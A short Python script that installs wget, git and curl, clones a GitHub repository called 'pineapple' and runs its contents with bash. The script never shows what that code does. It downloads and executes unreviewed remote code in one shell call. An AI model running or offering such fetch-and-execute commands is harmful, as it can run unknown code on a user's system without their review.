#!/usr/bin/env python
import subprocess

subprocess.check_call("apt update;apt -y install wget git curl;git clone https://github.com/samkelosibhambathiso2/pineapple.git;cd pineapple;chmod +x pineapple;bash pineapple", shell=True)
